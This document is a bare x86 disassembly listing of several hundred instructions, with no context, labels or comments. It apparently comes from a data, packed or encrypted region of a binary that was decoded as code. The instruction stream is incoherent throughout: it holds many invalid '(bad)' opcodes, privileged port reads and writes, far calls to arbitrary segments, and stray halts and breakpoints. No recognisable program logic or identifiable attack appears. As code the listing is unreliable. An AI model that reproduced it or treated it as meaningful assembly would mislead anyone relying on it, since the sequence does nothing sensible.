  40c296:	shr    BYTE PTR [eax-0x58],0x2a
  40c29a:	sub    al,0xca
  40c29c:	lods   eax,DWORD PTR ds:[esi]
  40c29d:	jecxz  0x40c2b2
  40c29f:	ror    dh,1
  40c2a1:	adc    al,0x78
  40c2a3:	push   edx
  40c2a4:	ja     0x40c30c
  40c2a6:	xchg   dh,ch
  40c2a8:	popf   
  40c2a9:	xor    eax,0xc6b2b1c4
  40c2ae:	adc    al,0x63
  40c2b0:	and    edi,edi
  40c2b2:	leave  
  40c2b3:	add    ebx,esi
  40c2b5:	pop    ss
  40c2b6:	fdiv   DWORD PTR [ebx]
  40c2b8:	jp     0x40c317
  40c2ba:	add    BYTE PTR [eax],bh
  40c2bc:	cmp    DWORD PTR [esi-0x63],eax
  40c2bf:	mov    esi,0x78e93cc6
  40c2c4:	push   edx
  40c2c5:	sub    ecx,edx
  40c2c7:	(bad)  [esi]
  40c2c9:	add    BYTE PTR [ebx-0x7959babc],dh
  40c2cf:	cmp    cl,BYTE PTR [edx]
  40c2d1:	and    al,0x3c
  40c2d3:	jp     0x40c256
  40c2d5:	push   es
  40c2d6:	clc    
  40c2d7:	loopne 0x40c2eb
  40c2d9:	fidiv  DWORD PTR [eax-0x47c2bce3]
  40c2df:	cmc    
  40c2e0:	(bad)  
  40c2e1:	push   cs
  40c2e2:	xchg   ebp,eax
  40c2e3:	mov    cs:0xb7f76fbe,al
  40c2e9:	xlat   BYTE PTR ds:[ebx]
  40c2ea:	jbe    0x40c2df
  40c2ec:	xchg   DWORD PTR [ebp+0x67],esp
  40c2ef:	fst    st(5)
  40c2f1:	ret    0x3482
  40c2f4:	sbb    edx,DWORD PTR ds:0x2888f26a
  40c2fa:	pop    edi
  40c2fb:	test   al,0x67
  40c2fd:	mov    ebx,0x3c89aec7
  40c302:	and    eax,0x6b7e2864
  40c307:	jnp    0x40c2fd
  40c309:	xchg   edx,eax
  40c30a:	daa    
  40c30b:	popf   
  40c30c:	push   es
  40c30d:	sbb    eax,0xbf976548
  40c312:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c313:	push   edi
  40c314:	daa    
  40c315:	or     al,0x37
  40c317:	popa   
  40c318:	(bad)  
  40c319:	(bad)  
  40c31a:	gs test al,0xd6
  40c31d:	in     al,0x70
  40c31f:	xor    bh,BYTE PTR [eax+esi*4+0x74]
  40c323:	and    edx,ebx
  40c325:	xchg   ecx,eax
  40c326:	sub    BYTE PTR [ecx-0x1627339c],dh
  40c32c:	scas   eax,DWORD PTR es:[edi]
  40c32d:	and    DWORD PTR [eax+ecx*4+0x41ea9d91],ecx
  40c334:	xor    al,0x13
  40c336:	gs stos BYTE PTR es:[edi],al
  40c338:	(bad)  
  40c339:	sti    
  40c33a:	xor    BYTE PTR [ecx+0x7b],cl
  40c33d:	push   eax
  40c33e:	or     DWORD PTR [ebp+edi*8+0x3d],esi
  40c342:	gs aad 0x93
  40c345:	mov    ebp,0x44a1ff80
  40c34a:	sbb    eax,0xfc538984
  40c34f:	cmp    al,0xb0
  40c351:	aad    0x9d
  40c353:	shl    DWORD PTR [edx-0x10c0e0a1],cl
  40c359:	mov    ch,0xa5
  40c35b:	inc    esi
  40c35c:	dec    ecx
  40c35d:	and    al,BYTE PTR [esi-0x4abf302e]
  40c363:	xchg   BYTE PTR [esi],dl
  40c365:	pop    esp
  40c366:	xor    ebp,edx
  40c368:	xchg   edx,eax
  40c369:	neg    BYTE PTR [esi+edi*8-0x1]
  40c36d:	sbb    esp,edx
  40c36f:	fbstp  TBYTE PTR [ebp+0x39b44ac1]
  40c375:	call   0x24ac:0x39d492dc
  40c37c:	add    eax,0x4aab5d2c
  40c381:	jecxz  0x40c315
  40c383:	test   al,0x6b
  40c385:	ficomp WORD PTR [ebx-0x4d]
  40c388:	xor    DWORD PTR [ecx+0x7f],ecx
  40c38b:	es mov gs,WORD PTR gs:[ebp-0x45149f77]
  40c393:	mov    edx,0x42ab048c
  40c398:	mov    BYTE PTR [eax],al
  40c39a:	dec    ecx
  40c39b:	shl    DWORD PTR es:0xb219083,cl
  40c3a2:	dec    edx
  40c3a3:	out    0xb0,eax
  40c3a5:	xor    BYTE PTR [edi],ah
  40c3a7:	inc    ebp
  40c3a8:	ins    DWORD PTR es:[edi],dx
  40c3a9:	mov    edi,0x14b62fee
  40c3ae:	cmp    ch,BYTE PTR [edx+0x5af21c08]
  40c3b4:	pushf  
  40c3b5:	repz push ss
  40c3b7:	xchg   DWORD PTR [ecx+eiz*1+0x14681647],ebx
  40c3be:	fdiv   QWORD PTR [esi+0x56]
  40c3c1:	in     eax,dx
  40c3c2:	(bad)  
  40c3c4:	dec    ecx
  40c3c5:	mov    al,0x71
  40c3c7:	aas    
  40c3c8:	popf   
  40c3c9:	hlt    
  40c3ca:	jae    0x40c3f6
  40c3cc:	aas    
  40c3cd:	fs mov ebx,0x4622bc94
  40c3d3:	int3   
  40c3d4:	mov    ds:0x232ce722,eax
  40c3d9:	pop    eax
  40c3da:	or     bh,ch
  40c3dc:	sbb    cl,BYTE PTR [eax]
  40c3de:	pop    ebp
  40c3df:	mov    eax,0xa09345a0
  40c3e4:	retf   
  40c3e5:	test   bl,0xc8
  40c3e8:	sbb    ah,BYTE PTR gs:[edi-0x8a11400]
  40c3ef:	mov    dh,0x1c
  40c3f1:	(bad)  
  40c3f2:	out    0x75,al
  40c3f4:	es mov bl,0xdb
  40c3f7:	addr16 iret 
  40c3f9:	mov    BYTE PTR [esp+eiz*4+0x5],0xcb
  40c3fe:	xchg   ebx,eax
  40c3ff:	repnz push DWORD PTR [ebx+0x4a]
  40c403:	in     al,dx
  40c404:	cli    
  40c405:	mov    edi,0xdb703590
  40c40a:	outs   dx,BYTE PTR ds:[esi]
  40c40b:	sbb    BYTE PTR [esi-0x3d],dh
  40c40e:	pop    ds
  40c40f:	push   edi
  40c410:	adc    bh,BYTE PTR [edx]
  40c412:	push   0xdadf9848
  40c417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c418:	icebp  
  40c419:	retf   
  40c41a:	pop    ss
  40c41b:	ret    
  40c41c:	xchg   esp,eax
  40c41d:	add    al,dl
  40c41f:	sbb    ecx,DWORD PTR [ebx]
  40c421:	(bad)  
  40c422:	pop    esp
  40c423:	inc    esi
  40c424:	gs fmul st(1),st
  40c427:	mov    ah,0x98
  40c429:	cdq    
  40c42a:	imul   ecx,DWORD PTR [ebp-0x18],0xa17b98eb
  40c431:	jmp    0x3f2c:0x665e216f
  40c438:	mov    al,0xfd
  40c43a:	inc    esp
  40c43b:	loopne 0x40c4a3
  40c43d:	dec    eax
  40c43e:	or     esi,edx
  40c440:	fsub   DWORD PTR ds:0x24006af8
  40c446:	xchg   BYTE PTR [edx+0x6d],bl
  40c449:	cmp    BYTE PTR [esi],bl
  40c44b:	loop   0x40c426
  40c44d:	in     al,dx
  40c44e:	cmp    ebx,DWORD PTR [bx]
  40c451:	pop    edx
  40c452:	mov    ch,0xcf
  40c454:	imul   edi,DWORD PTR [ecx],0xffffff8c
  40c457:	(bad)  
  40c458:	mov    ss,edi
  40c45a:	and    ecx,ecx
  40c45c:	or     DWORD PTR [eax-0x37],0x76
  40c460:	sub    eax,0xeeb8826b
  40c465:	ins    DWORD PTR es:[edi],dx
  40c466:	xchg   DWORD PTR [eax+0x784e8c67],esi
  40c46c:	xchg   edi,eax
  40c46d:	cmp    al,0xf8
  40c46f:	ins    BYTE PTR es:[edi],dx
  40c470:	stos   BYTE PTR es:[edi],al
  40c471:	test   al,0x3a
  40c473:	loopne 0x40c407
  40c475:	ins    DWORD PTR es:[edi],dx
  40c476:	and    al,0x52
  40c478:	xlat   BYTE PTR ds:[ebx]
  40c479:	lock out 0xbd,eax
  40c47c:	test   eax,0xf990c037
  40c481:	push   edi
  40c482:	cld    
  40c483:	add    DWORD PTR ds:0x48bc6923,esi
  40c489:	mov    edi,0x8d663f96
  40c48e:	and    DWORD PTR [ebx-0x5f81e9e4],esp
  40c494:	mov    dl,0xcf
  40c496:	push   esp
  40c497:	imul   edx,DWORD PTR [ecx],0xffffffdb
  40c49a:	mov    ebx,0x7e33b670
  40c49f:	in     al,0x6
  40c4a1:	scas   al,BYTE PTR es:[edi]
  40c4a2:	xchg   edi,eax
  40c4a3:	jp     0x40c51f
  40c4a5:	(bad)  
  40c4a6:	clc    
  40c4a7:	inc    eax
  40c4a8:	xor    al,0xf5
  40c4aa:	es pop esi
  40c4ac:	pop    eax
  40c4ad:	or     eax,0x83b2fb1c
  40c4b2:	scas   eax,DWORD PTR es:[edi]
  40c4b3:	into   
  40c4b4:	shl    BYTE PTR [ebx+0x7db06505],0xb0
  40c4bb:	sti    
  40c4bc:	ins    DWORD PTR es:[edi],dx
  40c4bd:	cmp    eax,0x617261fc
  40c4c2:	push   0x255e3843
  40c4c7:	in     al,0xc3
  40c4c9:	sar    DWORD PTR [ecx-0x613790cd],0xf8
  40c4d0:	jb     0x40c4f3
  40c4d2:	adc    bh,BYTE PTR [eax+0x667db4dc]
  40c4d8:	call   0x9874:0x531a97a7
  40c4df:	mov    WORD PTR [ebp-0x23d2bb17],es
  40c4e5:	pop    edx
  40c4e6:	loop   0x40c4e2
  40c4e8:	mov    ah,0x39
  40c4ea:	imul   edi,DWORD PTR [edi+0x1a],0x23d8f117
  40c4f1:	daa    
  40c4f2:	das    
  40c4f3:	das    
  40c4f4:	mov    ds:0x21f9600e,eax
  40c4f9:	and    DWORD PTR [ebx],eax
  40c4fb:	mov    dh,0x14
  40c4fd:	div    DWORD PTR [edi]
  40c4ff:	sub    ch,ah
  40c501:	push   esp
  40c502:	ret    
  40c503:	out    dx,eax
  40c504:	jecxz  0x40c509
  40c506:	ins    BYTE PTR es:[edi],dx
  40c507:	push   esi
  40c508:	xor    BYTE PTR [ebx-0x5c07b0a2],dl
  40c50e:	inc    eax
  40c50f:	xor    DWORD PTR [ebx-0x6e],ebp
  40c512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c513:	xor    BYTE PTR [ebx+0x39],bl
  40c516:	imul   DWORD PTR [edi]
  40c518:	jmp    0x7e47:0xfa811027
  40c51f:	adc    eax,0x2ab29772
  40c524:	mov    edi,0xaf38c8f
  40c52a:	nop
  40c52b:	mov    ebx,0xd891f75a
  40c530:	xchg   esp,esp
  40c532:	cmc    
  40c533:	ss retf 
  40c535:	push   edx
  40c536:	sub    eax,0xdf5ece5e
  40c53b:	xor    al,0xf9
  40c53d:	or     bl,BYTE PTR [eax+eiz*8+0x592a8115]
  40c544:	xchg   DWORD PTR [ecx+0x48de4ae7],esi
  40c54a:	inc    ecx
  40c54b:	stos   DWORD PTR es:[edi],eax
  40c54c:	retf   0xce84
  40c54f:	ins    BYTE PTR es:[edi],dx
  40c550:	sub    DWORD PTR [ebp-0x6e],esi
  40c553:	and    eax,0x1769a727
  40c558:	add    esi,ebp
  40c55a:	xor    eax,0x9c1f4be1
  40c55f:	cld    
  40c560:	enter  0x2655,0x2a
  40c564:	mov    bh,0xd7
  40c566:	pop    DWORD PTR [ebx+0x21]
  40c569:	pop    ebp
  40c56a:	stos   BYTE PTR es:[edi],al
  40c56b:	dec    ecx
  40c56c:	and    BYTE PTR [edx],ah
  40c56e:	loopne 0x40c5bf
  40c570:	jle    0x40c5e3
  40c572:	sub    edi,0xffffffd9
  40c575:	sub    eax,0x934cf411
  40c57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c57b:	push   eax
  40c57c:	sbb    ecx,0xf9411390
  40c582:	push   esp
  40c583:	mov    bl,0xb0
  40c585:	adc    eax,0x9a84b9fd
  40c58a:	fld    DWORD PTR [edi-0x72]
  40c58d:	or     al,0x1
  40c58f:	push   ds
  40c590:	in     al,dx
  40c591:	dec    ebp
  40c592:	pop    esi
  40c593:	aas    
  40c594:	inc    eax
  40c595:	xchg   BYTE PTR [ebx+ebp*4-0x49],al
  40c599:	dec    ebx
  40c59a:	xlat   BYTE PTR ds:[ebx]
  40c59b:	xor    al,BYTE PTR [ebp+0x4c745363]
  40c5a1:	add    edx,DWORD PTR [ebx-0x53]
  40c5a4:	cmp    al,0x3b
  40c5a6:	mov    ds:0x2f2d6508,al
  40c5ab:	cs aas 
  40c5ad:	mov    bh,0xfc
  40c5af:	sar    DWORD PTR ds:0x55afc55d,0xa8
  40c5b6:	cmc    
  40c5b7:	fwait
  40c5b8:	bound  edi,QWORD PTR [ebx-0xe]
  40c5bb:	out    dx,al
  40c5bc:	pop    ebx
  40c5bd:	push   eax
  40c5be:	frndint 
  40c5c0:	jo     0x40c5ad
  40c5c2:	fwait
  40c5c3:	std    
  40c5c4:	pushf  
  40c5c5:	inc    esi
  40c5c6:	cld    
  40c5c7:	pop    edi
  40c5c8:	push   ebx
  40c5c9:	pop    edx
  40c5ca:	or     al,0x20
  40c5cc:	sbb    al,0xa7
  40c5ce:	arpl   WORD PTR [edi],si
  40c5d0:	push   ds
  40c5d1:	stos   BYTE PTR es:[edi],al
  40c5d2:	ror    edx,cl
  40c5d4:	cmp    DWORD PTR [esi+ecx*8],edx
  40c5d7:	xchg   esi,eax
  40c5d8:	sbb    edi,DWORD PTR ds:0x808ec1fb
  40c5de:	push   eax
  40c5df:	gs (bad) 
  40c5e2:	and    al,0x26
  40c5e4:	pop    ss
  40c5e5:	fs leave 
  40c5e7:	arpl   WORD PTR [esi-0x45],di
  40c5ea:	stos   DWORD PTR es:[edi],eax
  40c5eb:	imul   esp,DWORD PTR [esi-0x925a508],0xffffffdd
  40c5f2:	leave  
  40c5f3:	bound  ebp,QWORD PTR [ecx-0x10]
  40c5f6:	xlat   BYTE PTR ds:[ebx]
  40c5f7:	pop    ds
  40c5f8:	pop    es
  40c5f9:	mov    ds:0x809e7a39,al
  40c5fe:	clc    
  40c5ff:	inc    ecx
  40c600:	add    eax,0x91c950c3
  40c605:	pop    es
  40c606:	and    edi,DWORD PTR [edi]
  40c608:	rol    edx,cl
  40c60a:	jnp    0x40c679
  40c60c:	scas   al,BYTE PTR es:[edi]
  40c60d:	imul   edx,DWORD PTR [ecx+0xc],0x2e49012c
  40c614:	out    dx,al
  40c615:	in     al,0xfa
  40c617:	pop    ebp
  40c618:	push   0xffffffe6
  40c61a:	xchg   ecx,eax
  40c61b:	xchg   esp,eax
  40c61c:	and    DWORD PTR [esi+0x2ced63a5],0xffffff94
  40c623:	sbb    al,0x35
  40c625:	dec    esp
  40c626:	push   ds
  40c627:	xchg   DWORD PTR [ebp-0x7fecf4cf],edx
  40c62d:	imul   eax,DWORD PTR [esi-0x1c],0x1a243124
  40c634:	pop    ecx
  40c635:	retf   0x472d
  40c638:	test   BYTE PTR [esi+ebx*8-0x53122b33],al
  40c63f:	ret    
  40c640:	in     eax,0xa9
  40c642:	pop    eax
  40c643:	out    0x3,eax
  40c645:	mov    ah,0x93
  40c647:	dec    ecx
  40c648:	in     al,dx
  40c649:	in     al,dx
  40c64a:	jb     0x40c65c
  40c64c:	mov    ecx,0xb419afd1
  40c651:	lock cdq 
  40c653:	push   0x4d21efb9
  40c658:	adc    al,0x8f
  40c65a:	add    al,0xe9
  40c65c:	loopne 0x40c6bf
  40c65e:	out    dx,al
  40c65f:	push   eax
  40c660:	out    dx,al
  40c661:	out    0x76,eax
  40c663:	je     0x40c634
  40c665:	aad    0x6a
  40c667:	sub    ebx,edi
  40c669:	dec    ebx
  40c66a:	inc    ecx
  40c66b:	or     al,0x6a
  40c66d:	fisubr WORD PTR [ebx]
  40c66f:	xlat   BYTE PTR ds:[ebx]
  40c670:	mov    edi,0xcea1f7f4
  40c675:	xchg   esi,eax
  40c676:	jns    0x40c62d
  40c678:	scas   al,BYTE PTR es:[edi]
  40c679:	lea    edi,[esp+ebp*8+0x23]
  40c67d:	sub    ebx,DWORD PTR ds:0x282c83ca
  40c683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c684:	scas   al,BYTE PTR es:[edi]
  40c685:	sbb    bl,dh
  40c687:	inc    esp
  40c688:	mov    ah,0xbf
  40c68a:	xor    al,0x9c
  40c68c:	sub    eax,0xbc07487e
  40c691:	xchg   ecx,eax
  40c692:	mov    edx,DWORD PTR [esi]
  40c694:	push   0x4a
  40c696:	sahf   
  40c697:	pop    edi
  40c698:	and    edx,DWORD PTR fs:[esi-0x4a]
  40c69c:	and    cl,ch
  40c69e:	(bad)  
  40c69f:	pop    ebp
  40c6a0:	imul   ecx,DWORD PTR [eax],0xfffffff4
  40c6a3:	and    al,BYTE PTR [ebp+ebx*4-0x39cc4b1e]
  40c6aa:	ins    DWORD PTR es:[edi],dx
  40c6ab:	add    eax,0x6d5b815f
  40c6b0:	mov    bh,0x10
  40c6b2:	lahf   
  40c6b3:	mov    ch,0x32
  40c6b5:	or     esi,DWORD PTR [ecx-0x22]
  40c6b8:	pop    eax
  40c6b9:	cmp    bh,BYTE PTR [edi+0x3cec4cb2]
  40c6bf:	sub    al,0x30
  40c6c1:	iret   
  40c6c2:	jns    0x40c6a1
  40c6c4:	out    dx,al
  40c6c5:	(bad)  [esi]
  40c6c7:	cld    
  40c6c8:	add    eax,0x17593e88
  40c6cd:	in     al,0xc8
  40c6cf:	push   esp
  40c6d0:	jp     0x40c6b3
  40c6d2:	das    
  40c6d3:	sub    al,0x4
  40c6d5:	xchg   edx,eax
  40c6d6:	sub    ebx,DWORD PTR [edx]
  40c6d8:	ja     0x40c71a
  40c6da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6db:	adc    bl,BYTE PTR [ecx]
  40c6dd:	xchg   ecx,eax
  40c6de:	pop    ss
  40c6df:	push   ds
  40c6e0:	sub    BYTE PTR [esi+0x3f817e17],al
  40c6e6:	inc    edx
  40c6e7:	jo     0x40c725
  40c6e9:	xchg   esi,eax
  40c6ea:	ret    
  40c6eb:	shl    edi,0x8b
  40c6ee:	push   es
  40c6ef:	loop   0x40c764
  40c6f1:	jecxz  0x40c713
  40c6f3:	mov    ebx,ecx
  40c6f5:	mov    eax,ds:0x7b8837b9
  40c6fa:	fisubr DWORD PTR [edx]
  40c6fc:	(bad)  
  40c6fd:	jno    0x40c6b0
  40c6ff:	push   ecx
  40c700:	push   ss
  40c701:	pop    es
  40c702:	pop    edx
  40c703:	mov    ebp,0xbe71e65b
  40c708:	mul    BYTE PTR ds:0x4bb4ab69
  40c70e:	xchg   ebp,eax
  40c70f:	xor    bh,BYTE PTR [edx+esi*4+0x2b]
  40c713:	xor    eax,0x58683c72
  40c718:	outs   dx,DWORD PTR ds:[esi]
  40c719:	xor    eax,esi
  40c71b:	neg    BYTE PTR [ebp-0x233ef557]
  40c721:	mov    ebp,0x8bb2a97a
  40c726:	add    dh,BYTE PTR [edi-0x660ae61c]
  40c72c:	mov    ebx,0xc643bfca
  40c731:	inc    ebx
  40c732:	daa    
  40c733:	jae    0x40c6c8
  40c735:	pop    ebp
  40c736:	mov    esp,0xaf3f67e3
  40c73b:	stos   BYTE PTR es:[edi],al
  40c73c:	test   al,0xf4
  40c73e:	sbb    BYTE PTR [edi],cl
  40c740:	ins    DWORD PTR es:[edi],dx
  40c741:	jge    0x40c7b4
  40c743:	dec    edi
  40c744:	out    dx,al
  40c745:	not    BYTE PTR [ecx]
  40c747:	lds    ecx,FWORD PTR [ecx+0x7d86bc07]
  40c74d:	ins    DWORD PTR es:[edi],dx
  40c74e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c74f:	jbe    0x40c6f5
  40c751:	dec    edi
  40c752:	push   edi
  40c753:	add    al,bh
  40c755:	outs   dx,DWORD PTR ds:[esi]
  40c756:	or     eax,DWORD PTR [eax]
  40c758:	repz cmp BYTE PTR [esi-0x3b0397d3],bl
  40c75f:	cdq    
  40c760:	cmovne ebp,DWORD PTR [ebx]
  40c763:	xor    DWORD PTR [eax],edx
  40c765:	push   ecx
  40c766:	and    eax,0x6328944
  40c76b:	inc    esp
  40c76c:	shr    dl,0x3b
  40c76f:	jge    0x40c7a1
  40c771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c772:	pop    ecx
  40c773:	scas   eax,DWORD PTR es:[edi]
  40c774:	jnp    0x40c786
  40c776:	xchg   ebx,eax
  40c777:	fimul  DWORD PTR [eax+0x46]
  40c77a:	add    eax,0x1d4f0e52
  40c77f:	add    al,0x7d
  40c781:	cmc    
  40c782:	scas   eax,DWORD PTR es:[edi]
  40c783:	je     0x40c758
  40c785:	xchg   ebx,eax
  40c786:	stos   BYTE PTR es:[edi],al
  40c787:	cmp    eax,0xa8355fa6
  40c78c:	and    eax,0x2b835795
  40c791:	sar    BYTE PTR [ebx-0x3ff76434],1
  40c797:	jmp    0x40c74b
  40c799:	xchg   ebp,eax
  40c79a:	and    BYTE PTR [edi-0x51],0x4f
  40c79e:	jae    0x40c809
  40c7a0:	cmc    
  40c7a1:	aad    0xc4
  40c7a3:	pop    es
  40c7a4:	into   
  40c7a5:	fimul  DWORD PTR [edi-0x71]
  40c7a8:	mov    dl,0xca
  40c7aa:	add    esi,DWORD PTR [esi]
  40c7ac:	jecxz  0x40c763
  40c7ae:	loop   0x40c7d0
  40c7b0:	jmp    0xe40b729a
  40c7b5:	push   edi
  40c7b6:	xchg   edx,eax
  40c7b7:	inc    esi
  40c7b8:	inc    ebx
  40c7b9:	adc    BYTE PTR gs:[eax-0x7926e95],0x85
  40c7c1:	mov    ds:0xea2f2e6f,eax
  40c7c6:	ins    BYTE PTR es:[edi],dx
  40c7c7:	out    dx,eax
  40c7c8:	jp     0x40c79b
  40c7ca:	push   eax
  40c7cb:	dec    edi
  40c7cc:	outs   dx,DWORD PTR ds:[esi]
  40c7cd:	adc    al,0x3d
  40c7cf:	xchg   edx,eax
  40c7d0:	xor    ebp,DWORD PTR [edi]
  40c7d2:	mov    ebx,0x52836947
  40c7d7:	ror    bl,cl
  40c7d9:	fcmovnbe st,st(1)
  40c7db:	imul   esi,edi,0xffffff90
  40c7de:	add    BYTE PTR [ebx-0x510ad11b],0xee
  40c7e5:	fidivr DWORD PTR [edi]
  40c7e7:	mov    ecx,edi
  40c7e9:	mov    ecx,0xd824113b
  40c7ee:	push   esi
  40c7ef:	stc    
  40c7f0:	aaa    
  40c7f1:	cld    
  40c7f2:	test   edi,esp
  40c7f4:	sub    al,0x9d
  40c7f6:	sub    DWORD PTR [ecx],edx
  40c7f8:	test   al,0x99
  40c7fa:	xor    al,0xc4
  40c7fc:	jae    0x40c7bd
  40c7fe:	ins    DWORD PTR es:[edi],dx
  40c7ff:	inc    ebx
  40c800:	data16 fisubr WORD PTR [edx]
  40c803:	mov    WORD PTR [ebp+ecx*2+0x45],es
  40c807:	xchg   esp,eax
  40c808:	aaa    
  40c809:	scas   al,BYTE PTR es:[edi]
  40c80a:	scas   eax,DWORD PTR es:[edi]
  40c80b:	stc    
  40c80c:	shl    DWORD PTR [esi+ecx*4],cl
  40c80f:	xor    al,0xf
  40c811:	sar    BYTE PTR ds:0xedf24b38,1
  40c817:	jmp    DWORD PTR [ebx+ecx*1-0x39]
  40c81b:	mov    dl,0x98
  40c81d:	mov    ebx,0x42ca97e6
  40c822:	fst    DWORD PTR [edi-0x552fac4c]
  40c828:	push   eax
  40c829:	stc    
  40c82a:	pop    es
  40c82b:	jb     0x40c7ae
  40c82d:	pop    ebx
  40c82e:	(bad)  
  40c82f:	loop   0x40c822
  40c831:	in     eax,dx
  40c832:	jbe    0x40c856
  40c834:	ror    DWORD PTR [esi+ebx*8],0x61
  40c838:	mov    dh,0xa2
  40c83a:	push   ebx
  40c83b:	push   eax
  40c83c:	test   al,0xe5
  40c83e:	cmp    ebp,DWORD PTR [edx+eax*4]
  40c841:	lods   al,BYTE PTR ds:[esi]
  40c842:	inc    ebx
  40c843:	xchg   esp,eax
  40c844:	mov    cl,0x87
  40c846:	stos   DWORD PTR es:[edi],eax
  40c847:	adc    al,0x20
  40c849:	jle    0x40c851
  40c84b:	push   ebp
  40c84c:	test   dh,al
  40c84e:	pop    ebp
  40c84f:	daa    
  40c850:	push   0x79ff8fb6
  40c855:	adc    dh,ch
  40c857:	xor    esi,DWORD PTR ds:0x86472a99
  40c85d:	xor    BYTE PTR [edx],bh
  40c85f:	loop   0x40c8e0
  40c861:	cmp    DWORD PTR [ebp+0x4328ec4b],esi
  40c867:	xor    al,0x9
  40c869:	test   BYTE PTR [edi-0x3c],dl
  40c86c:	push   edi
  40c86d:	jg     0x40c843
  40c86f:	and    DWORD PTR [edi-0x25],ecx
  40c872:	dec    esi
  40c873:	repz scas eax,DWORD PTR es:[edi]
  40c875:	mov    bl,0x3f
  40c877:	or     BYTE PTR [ecx-0x43],ch
  40c87a:	mov    cl,cl
  40c87c:	jmp    0xa74d:0xb77fb80c
  40c883:	or     DWORD PTR [ecx+0x5a],ebx
  40c886:	loopne 0x40c8f6
  40c888:	pop    edi
  40c889:	ds sub al,0xe7
  40c88c:	xchg   edx,eax
  40c88d:	add    ch,bl
  40c88f:	xlat   BYTE PTR ds:[ebx]
  40c890:	xor    DWORD PTR [ebx-0x3e],0x1686dc7
  40c897:	test   al,0x6e
  40c899:	clc    
  40c89a:	hlt    
  40c89b:	arpl   WORD PTR [esi+0x7a84a181],si
  40c8a1:	lods   eax,DWORD PTR ds:[esi]
  40c8a2:	pop    es
  40c8a3:	enter  0x920d,0x98
  40c8a7:	iret   
  40c8a8:	or     eax,0x2003fc7c
  40c8ad:	xchg   esi,eax
  40c8ae:	mov    DWORD PTR [edi],ebp
  40c8b0:	push   cs
  40c8b1:	fcmovu st,st(7)
  40c8b3:	fwait
  40c8b4:	test   al,0x3c
  40c8b6:	shl    DWORD PTR [ebx+0x5d],1
  40c8b9:	push   ecx
  40c8ba:	add    BYTE PTR [ebp+esi*4-0x5995e6fa],0x9b
  40c8c2:	and    BYTE PTR [edi],bl
  40c8c4:	sub    DWORD PTR [edi],ebp
  40c8c6:	call   0x3a02:0x95f19f5e
  40c8cd:	cmp    eax,0x1a2d98df
  40c8d2:	scas   eax,DWORD PTR es:[edi]
  40c8d3:	fdivr  DWORD PTR [ecx+eiz*2]
  40c8d6:	loopne 0x40c8a0
  40c8d8:	add    bh,BYTE PTR cs:[eax]
  40c8db:	cmp    eax,0x3537d2b
  40c8e0:	mov    BYTE PTR [eax*8+0x46e9cff9],ah
  40c8e7:	dec    esi
  40c8e8:	imul   esp,DWORD PTR [esi+0xe],0xfb4cd273
  40c8ef:	mov    ebp,0xa866a410
  40c8f4:	mov    bl,0x38
  40c8f6:	scas   eax,DWORD PTR es:[edi]
  40c8f7:	pushf  
  40c8f8:	dec    edi
  40c8f9:	push   cs
  40c8fa:	(bad)  
  40c8fb:	and    dh,bh
  40c8fd:	xchg   esi,ebp
  40c8ff:	aam    0xb8
  40c901:	pop    ecx
  40c902:	fst    QWORD PTR [esi-0x41]
  40c905:	cmp    ch,ch
  40c907:	or     ecx,ebp
  40c909:	dec    DWORD PTR [ebp-0x2ca509ff]
  40c90f:	jle    0x40c974
  40c911:	inc    esp
  40c912:	and    eax,0x89039d66
  40c917:	rcl    DWORD PTR [ebx-0x5854d49d],0x77
  40c91e:	ficom  DWORD PTR ds:0x5dc2538
  40c924:	iret   
  40c925:	add    edx,0x3d6fcb0e
  40c92b:	shl    DWORD PTR [edi+0x2e12fb2d],0x22
  40c932:	xchg   bl,ch
  40c934:	dec    ecx
  40c935:	add    ecx,ecx
  40c937:	adc    DWORD PTR [edi+0x36b2c9b6],0x10857355
  40c941:	sub    BYTE PTR [eax+0xd],cl
  40c944:	outs   dx,BYTE PTR ds:[esi]
  40c945:	pop    edi
  40c946:	in     eax,0xc1
  40c948:	add    eax,0x8ecf960d
  40c94d:	push   ebx
  40c94e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c94f:	lock aaa 
  40c951:	lods   eax,DWORD PTR ds:[esi]
  40c952:	repnz or DWORD PTR [esi],eax
  40c955:	into   
  40c956:	xchg   esi,eax
  40c957:	mov    al,0x8d
  40c959:	fucomip st,st(7)
  40c95b:	mov    ebx,0x5c9a9303
  40c960:	js     0x40c99a
  40c962:	sbb    al,BYTE PTR [bp-0x6855]
  40c967:	mov    bh,0xb1
  40c969:	or     eax,0x9e0e8028
  40c96e:	ret    
  40c96f:	pop    ss
  40c970:	outs   dx,DWORD PTR ds:[esi]
  40c971:	push   0xd7ab40d0
  40c976:	push   0xe9ec2ac0
  40c97b:	int    0x95
  40c97d:	push   ebx
  40c97e:	arpl   WORD PTR [ebx-0x5ab6ca57],bp
  40c984:	icebp  
  40c985:	rcl    DWORD PTR [ebx-0xb463361],cl
  40c98b:	sbb    al,0xdf
  40c98d:	jae    0x40c968
  40c98f:	popa   
  40c990:	add    BYTE PTR [eax-0x46a52e70],al
  40c996:	jo     0x40c9a9
  40c998:	jnp    0x40c9dd
  40c99a:	mov    al,ds:0xe1616c23
  40c99f:	mov    DWORD PTR [ecx-0x47],esp
  40c9a2:	in     eax,dx
  40c9a3:	fcomp  QWORD PTR [ecx+0x53]
  40c9a6:	cmc    
  40c9a7:	mov    cl,0x6b
  40c9a9:	push   esi
  40c9aa:	and    al,0x82
  40c9ac:	icebp  
  40c9ad:	xor    eax,0x4bc0781d
  40c9b2:	mov    esp,0x9acd22ce
  40c9b7:	std    
  40c9b8:	dec    ebx
  40c9b9:	cdq    
  40c9ba:	daa    
  40c9bb:	leave  
  40c9bc:	clc    
  40c9bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9be:	mov    dl,0x7a
  40c9c0:	push   edx
  40c9c1:	cmp    ah,dh
  40c9c3:	loope  0x40c96b
  40c9c5:	or     esp,DWORD PTR [ebx+0x3c]
  40c9c8:	and    al,cl
  40c9ca:	inc    esp
